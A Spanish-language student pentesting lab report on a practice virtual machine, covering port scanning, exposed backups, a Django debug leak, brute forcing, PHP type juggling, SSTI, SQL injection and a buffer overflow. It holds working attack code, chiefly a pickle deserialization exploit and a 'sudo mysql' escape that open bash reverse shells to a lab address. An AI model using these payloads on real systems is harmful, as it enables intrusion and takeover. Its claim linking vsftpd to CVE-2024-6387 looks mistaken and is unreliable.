# Informe de Práctica 1: Análisis de Vulnerabilidades en Entorno Web

---

**Universidad UNIE**  
**Seguridad Informática y Ciberseguridad en la Empresa**  
**Curso 2025/2026**

---

## Integrantes del Grupo

- **Alejandro Gonzalo Millón**
- **Daniel Relloso Orcajo**
- **Daniel Willson Pastor**

**Fecha de entrega:** 4 de diciembre de 2025

---

## Introducción

Nuestra misión ha sido emular las tácticas de un atacante real, aplicando metodologías estructuradas de pentesting para descubrir y explotar vulnerabilidades en tres aplicaciones web independientes (App1, App2 y App3). Cada aplicación, desarrollada con diferentes tecnologías y arquitecturas, presentaba su propio conjunto de debilidades, algunas evidentes y otras ocultas tras capas de código aparentemente seguro.

Hemos seguido una metodología en fases, comenzando con el reconocimiento pasivo y activo del objetivo, identificando servicios expuestos, puertos abiertos y tecnologías subyacentes. Posteriormente, hemos realizado una enumeración exhaustiva de cada aplicación, buscando vectores de ataque como:

- **Exposición de información sensible:** Código fuente, credenciales, esquemas de base de datos...
- **Vulnerabilidades de inyección:** SQL, SSTI, RCE, comandos...
- **Fallos de autenticación y autorización:** Accesos no controlados, bypass de login...
- **Errores de configuración:** Debug activado, backups accesibles públicamente...

Para cada vulnerabilidad identificada, hemos documentado no solo su explotación técnica, sino también el impacto potencial en un entorno real. De las mitigaciones nos centraremos en la siguiente práctica.

## Índice de vulnerabilidades encontradas
| Vulnerabilidad                              | Ubicación | Riesgo  |
| ------------------------------------------- | --------- | ------- |
| Exposición código fuente<br>por backup      | 9001      | Alto    |
| Información sensible<br>por debug = true    | app1      | Medio   |
| Contraseñas débiles                         | app1,2    | Alto    |
| RCE via Pickle                              | app 1     | Crítico |
| PHP Type Juggling                           | app 2     | Alto    |
| SQL Injection                               | app 3     | Crítico |
| SSTI                                        | app 3     | Crítico |
| Overflow + Format String                    | app 5     | Alto    |
| Permisos y grupos<br>mal configurados       | máquina   | Crítico |
| Permisos mal configurados<br>para SQL       | máquina   | Grave   |
| Tráfico sin cifrar y<br>falta de protección | app1,2,3  | Bajo    |

---

## Fase 1: Reconocimiento y Enumeración

### TCP
**Comando Ejecutado:**

```bash
nmap 192.168.88.128
```

**Resultados Obtenidos:**

![Nmap a UBUNTU](photos/NMAP.png)

### Análisis Detallado por Puerto

#### Puerto 21/tcp - FTP (vsftpd)

```text
21/tcp    open   ftp     vsftpd (broken: both local and anonymous access disabled!)
```

**Observaciones:**

- Servidor: vsftpd (Very Secure FTP Daemon)
- Estado: Acceso anónimo deshabilitado según el escaneo
- Conclusión: No podemos acceder sin credenciales válidas. Posible vector si encontramos credenciales en otro lugar.
- Esta versión se puede explotar con **CVE-2024-6387**

#### Puerto 22/tcp - SSH

```text
22/tcp    open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a1:a0:86:5d:7c:7f:4e:f4:ab:ca:90:0d:49:89:e4:7c (ECDSA)
|_  256 30:c4:82:38:86:3e:08:3e:87:5c:a8:08:f6:8d:fe:e1 (ED25519)
```

**Observaciones:**

- Versión: OpenSSH 9.6p1 (actual, sin vulnerabilidades críticas conocidas)
- Sistema: Ubuntu 3ubuntu13.11
- Conclusión: SSH normalmente es difícil de vulnerar directamente. Requeriría credenciales válidas o una vulnerabilidad específica en esta versión.

#### Puerto 80/tcp - HTTP

```text
80/tcp    open   http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

**Observaciones:**

- Servidor: Apache 2.4.58 en Ubuntu
- Conclusión: Puerto principal para aplicaciones web. Posibles vectores:
  - Aplicaciones vulnerables (App1, App2, App3)
  - Configuraciones incorrectas
  - Vulnerabilidades en Apache

#### Puerto 3306/tcp - MySQL/MariaDB

```text
3306/tcp  open   mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

**Observaciones:**

- Base de datos: MariaDB 10.3.23 o anterior
- Estado: "unauthorized" - acceso denegado sin credenciales
- Conclusión: Potencial para:
  - Inyección SQL si las apps tienen vulnerabilidades
  - Acceso directo si encontramos credenciales
  - Enumeración si la configuración lo permite

#### Puerto 5555/tcp - Freeciv

```text
5555/tcp open  freeciv
```

**Observaciones:**

- Servicio: Freeciv (juego de estrategia)
- Conclusión: Posible vector si:
  - Hay vulnerabilidades en el servicio
  - Se usa para algo diferente a Freeciv (servicio mal etiquetado)

#### Puerto 9001/tcp - HTTP (SimpleHTTPServer)

```text
9001/tcp  open   http    SimpleHTTPServer 0.6 (Python 3.13.0)
|_http-server-header: SimpleHTTP/0.6 Python/3.13.0
|_http-title: Directory listing for /
```

**Observaciones CRÍTICAS:**

- Servidor: SimpleHTTPServer de Python 3.13.0
- **LISTADO DE DIRECTORIOS HABILITADO** - ¡Grave error de configuración!
- Conclusión: Posible exposición de archivos sensibles. Primer vector de ataque importante.
### UDP
**Comando ejecutado:**
![[Pasted image 20251203110814.png]]
Hay un puerto filtrado en el 5353
### Resumen de Hallazgos Iniciales

#### Riesgos Identificados:

| Puerto | Servicio | Riesgo     | Acción Recomendada                       |
| ------ | -------- | ---------- | ---------------------------------------- |
| 21     | FTP      | Medio      | Buscar credenciales en otros vectores    |
| 22     | SSH      | Bajo       | Último recurso, difícil de explotar      |
| 80     | HTTP     | ALTO       | Principal vector - 3 aplicaciones web    |
| 3306   | MariaDB  | Medio-Alto | Depende de vulnerabilidades en apps      |
| 5555   | Freeciv  | Bajo       | Investigar si es realmente Freeciv       |
| 9001   | HTTP     | CRÍTICO    | Listado directorios - posible filtración |

#### Plan de Ataque Inicial:

1. **Primer objetivo:** Puerto 9001 - Investigar listado de directorios
2. **Segundo objetivo:** Puerto 80 - Enumerar aplicaciones web
3. **Tercer objetivo:** Buscar conexiones entre servicios
4. **Cuarto objetivo:** Credenciales para servicios restringidos

### Conclusiones Tácticas

- El servidor está relativamente bien cerrado - solo puertos esenciales abiertos
- El error de configuración en el puerto 9001 es nuestra puerta de entrada principal
- La presencia de MariaDB sugiere que las aplicaciones usan bases de datos → posible SQL injection
- Tres aplicaciones web distintas en el puerto 80 sugieren arquitectura modular con posibles fallos en cada una

---

## Vulnerabilidades Identificadas

A continuación se presentan las vulnerabilidades descubiertas durante el proceso de análisis y explotación del objetivo:

# explicar el tema de los permisos sudo
******************************************************
# Puerto 9001
Al entrar a http://192.168.207.130:9001/ podemos ver los directorios y vemos que tenemos para descargar sin uniciar sesión los siguientes archivos
- backup_app1.tar.gz
- backup_app2.tar.gz
- backup_app3.tar.gz
Tras descargar estos archivos podemos ver el código de las 3 páginas, una vulnerabilidad bastante importante porque le estás regalando al atacante el código de las páginas web. Esto es una vulnerabilidad ya que están los backups expuestos sin ningún tipo de verificación

Tampoco está encriptada la comunicación de la página web (https) por lo que esto es otra vulnerabilidad
![[Pasted image 20251204200546.png]]
## APP 1
Tras tratar de hacer login en http://app1.unie/users/login/ nos salta un error que nos da demasiada información debido a que en la app está puesto el `DEBUG = True`, por este error obtenemos mucha información como 
```
databases:
{'default': {'ATOMIC_REQUESTS': True,
             'AUTOCOMMIT': True,
             'CONN_HEALTH_CHECKS': False,
             'CONN_MAX_AGE': 0,
             'ENGINE': 'django.db.backends.mysql',
             'HOST': 'localhost',
             'NAME': 'app1_database',
             'OPTIONS': {},
             'PASSWORD': '********************',
             'PORT': '',
             'TEST': {'CHARSET': None,
                      'COLLATION': None,
                      'MIGRATE': True,
                      'MIRROR': None,
                      'NAME': None},
             'TIME_ZONE': None,
             'USER': 'app1_user'}}
```

Como en **/users/login** independientemente de que esté bien o mal te redirige tuve la idea de ir al panel de administrador donde no hay redirección y podemos hacer fuerza bruta. Lo único que también está protegido por CSRF por lo que cree un script (bruteforce.py) el cual pasándola la wordlist rockyou.txt sacamos que la contraseña es admin, una contraseña poco segura.

### RCE Unpickle
El codigo relacionado con esto se encuentrea en /var/www/html/app1/users/views.py , exactamente en la linea 84 de la clase profileview
![[Pasted image 20251203102909.png]]
ahora que confirmamos que está lo explotamos

Para empezar, la página está protegida con **CSRF** por lo que vamos a tener que obtener los csrfs (de login.html) y las cookies de mi sesion
```
curl -c cookies.txt http://app1.unie/users/login/ -s > login.html

CSRF1=$(grep -o "csrfmiddlewaretoken.*value='[^']*'" login.html | sed "s/.*value='//;s/'//")
[ -z "$CSRF1" ] && CSRF1=$(grep -o 'csrfmiddlewaretoken.*value="[^"]*"' login.html | sed 's/.*value="//;s/"//')
```
Una vez tenemos el csrf tratamos de hacer login (para esto me he tenido que crear un usuario llamado alejandro con contraseña 1234)
```
curl -b cookies.txt -c cookies.txt -v \
  -d "username=alejandro&password=1234&csrfmiddlewaretoken=$CSRF1&next=/users/profile/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://app1.unie/users/login/" \
  http://app1.unie/users/login/ 2>&1 | grep -i "set-cookie\|location\|http" 
```
Ahora que hemos iniciado sesión y estamos autenticados tenemos que obtener el home autenticado para extrael el csrf de este 
```
curl -b cookies.txt http://app1.unie/ -s > home_autenticado.html
```
Ahora tenemos que sacar el csrf, para esto tenemos que buscar el formulario de profile (ya que no puedes ir a http://app1.unie/users/profile/ directamente desde el buscador y tienes que ir desde la pagina de inicio)
```
grep -n "action=\"/users/profile/\"" home_autenticado.html

LINEA=$(grep -n "action=\"/users/profile/\"" home_autenticado.html | cut -d: -f1)
if [ ! -z "$LINEA" ]; then
    echo "Formulario encontrado en línea $LINEA"
    sed -n "$((LINEA-10)),$((LINEA+10))p" home_autenticado.html
fi

PROFILE_CSRF=$(cat home_autenticado.html | tr '>' '\n' | grep "csrfmiddlewaretoken" | sed 's/.*value="//' | sed 's/".*//')
echo "CSRF extraído: $PROFILE_CSRF"
```

> [!WARNING]  
> Tienes que copiar el csrf que salga en pantalla y poner PROFILE_CSRF="csrf" como en la imagen

![[Pasted image 20251204163818.png]]
Una vez ya tenemos el csrf del perfil podemos hacer el RCE, en este caso vamos a hacer una reverse shell por lo que nos ponemos a escuchar con
```
ncat -nlvp 4444
```
y mandamos el siguiente exploit
```
REVERSE_PAYLOAD=$(python3 << 'EOF'
import pickle, base64

class RCE:
    def __reduce__(self):
        import os
        cmd = "bash -c 'bash -i >& /dev/tcp/192.168.207.1/4444 0>&1' &"
        return os.system, (cmd,)

print(base64.b64encode(pickle.dumps(RCE())).decode())
EOF
)

echo "Enviando reverse shell a 192.168.207.1:4444..."
curl -b cookies.txt -X POST \
  -d "usernameSlug=$REVERSE_PAYLOAD&csrfmiddlewaretoken=$PROFILE_CSRF" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://app1.unie/" \
  http://app1.unie/users/profile/ -s > /dev/null

echo "Payload enviado. Revisa tu listener..."
```
y confirmamos que hemos conseguido la reverse shell
![[Pasted image 20251204164328.png]]
## APP 2 

### PHP type juggling
Primero reviso el código de la parte del login para saber como tengo que rellenarlo
![[Pasted image 20251203100647.png]]
Primero revisamos la respuesta cuando ponemos un mail y contraseña correctos
![[Pasted image 20251203100938.png]]
y vemos que poniendo
```bash
curl -X POST http://app2.unie/v2/users/login -H "Content-Type: application/json" -d '{"email":"admin@app2.unie","password":true}'
```
nos devuelve lo correcto por lo que confirmamos que hay **PHP type juggling**
![[Pasted image 20251203101135.png]]
(todo esto se puede hacer con la petición de login encontrada en http://app2.unie/docs/ utilizando burp suite)

## APP 3
### SSTI
Vemos que el código malicioso está en la linea 70, exactamente con la creación del usuario
![[Pasted image 20251204172217.png]]
Nos creamos un usuario donde el nombre sea `{{7*7}}` y al iniciar sesion vemos que en el nombre sale 49
![[Pasted image 20251204190344.png]]
pero al intentar otro tipo de SSTI (como `{{ cycler.__globals__.os.popen('id').read() }}`) nos da internal server error (como cuando era correcto lo que ponemos en SQL injection)
![[Pasted image 20251204190517.png]]
![[Pasted image 20251204190531.png]]

### SQL Injection
En la app3 hay sql injection ya que cuando ponemos 
```
`a' OR '1'='1' --`
```
de usuario y lo que sea de contraseña nos da un internal error
![[Pasted image 20251204183003.png]]
en vez de indicar que ha fallado el inicio de sesión
![[Pasted image 20251204183035.png]]
Esto también lo confirmamos ya que cuando probamos con order by nos salta el internal error con order by 6
![[Pasted image 20251204184014.png]]
# 5555
Estando en la máquina reviso los procesos relacionados con app con
```bash
ps aux | grep -i app
```
lo que nos da
```bash
user@user-VMware-Virtual-Platform:~$ ps aux | grep -i app
root        1843  0.0  0.0   9288  3788 ?        Ss   11:42   0:00 socat TCP-LISTEN:5555,fork,reuseaddr, exec:/opt/app5/app5,stderr
user        3855  0.5  1.9 243036 75504 ?        S    11:42   0:00 /usr/bin/Xwayland :0 -rootless -noreset -accessx -core -auth /run/user/1000/.mutter-Xwaylandauth.STG8F3 -listenfd 4 -listenfd 5 -displayfd 6 -initfd 7 -byteswappedclients
user        4068  1.7  1.6 3214480 64164 ?       Sl   11:42   0:00 gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js -E -P /usr/share/gnome-shell/extensions/ding@rastersoft.com/app
user        4170  1.0  1.5 1056256 63044 ?       Sl   11:42   0:00 /usr/bin/gnome-calendar --gapplication-service
user        4468  0.0  0.0   9144  2248 pts/0    S+   11:42   0:00 grep --color=auto -i app
```
por lo que vemos en 
```bash
root        1843  0.0  0.0   9288  3788 ?        Ss   11:42   0:00 socat TCP-LISTEN:5555,fork,reuseaddr, exec:/opt/app5/app5,stderr
```
parece un servicio personalizado que ejecuta /opt/app5/app5 por lo que revisamos el archivo y sus permisos
```bash
user@user-VMware-Virtual-Platform:~$ file /opt/app5/app5
/opt/app5/app5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6794c42ba9fce64417f4fc13d5be2017ef50bbb0, for GNU/Linux 3.2.0, with debug_info, not stripped
user@user-VMware-Virtual-Platform:~$ ls -la /opt/app5/app5
-rwxr-xr-x 1 root root 15688 Sep 29 14:55 /opt/app5/app5
```
con esto confirmamos que es x86-64 bit, usa librerías compartidas, tiene debug activado y si logramos explotarlo podemos tener acceso como root

Antes de nada primero reviso si puedo interactar con el poniendo
```
nc localhost 5555
```
y luego escribiendo cualquier cosa recibiendo


También revisamos el código fuente
![[Pasted image 20251118122743.png]]

Ahora vamos a revisar el archivo con gbd
```bash
gdb /opt/app5/app5
info functions
disas main
```
![[Pasted image 20251118120931.png]]
![[Pasted image 20251118120436.png]]
![[Pasted image 20251118120524.png]]
Aqui lo más importante es que lee la entrada con scanf para leer la entrada, pero tambien tenemos que el main es visible y que tiene un buffer de 512 bytes y con GNU_STACK podriamos ejecutar shellcode
Ahora vamos a comprobar si hay buffer ovweflow con 
```
python3 -c "print('A' * 600)" | nc localhost 5555
```
y tras ponerlo vemos que ahora no sale el texto que salia antes por lo que lo confirmamos
![[Pasted image 20251118121221.png]]
Probando encontramos una **vulnerabilidad** tipo **Format String Vulnerability**
# Reverse shell a través de SQL
Para reverse shell he encontrado dos formas de hacerlo aunque aqui hablo de a través de SQL ya que la otra es con RCE con unpickle.

> [!IMPORTANT]  
> Para todos los casos tenemos que usar lo siguiente en nuestra máquina principal:
> *ncat -nlvp 4444*
> El 4444 es opcional, puedes poner el puerto que quieras (pero que no esté en uso) para ponernos por escuchar y así recibir la terminal

Conectándonos a la maquina por ssh con ssh *user@192.168.207.130* accedemos como user aunque tenemos permiso de sudo, igualmente podemos hacer una reverse shell para estar como root ya que están mal configurados los permisos de SQL.
Para conseguir esto tenemos que poner esto (una vez dentro con ssh):
```
sudo mysql (conectarnos a sql)
system bash -c "bash -i >& /dev/tcp/192.168.207.1/4444 0>&1"
```

con esto en la terminal donde ponemos ncat nos llega 
![[Pasted image 20251203094003.png]]
donde vemos que tenemos permiso de root y estamos efectivamente dentro de la maquina
### Explicación de los permisos sudo -l
![[Pasted image 20251204194214.png]]
Como se puede observar, los grupos y permisos por usuario están mal configurados ya que este usuario que es un user normal tiene permisos para ejecutar cualquier comando como cualquier usuario y estando en cualquier grupo, otra vulnerabilidad ya que esta persona no debería de tener permisos y los tiene.

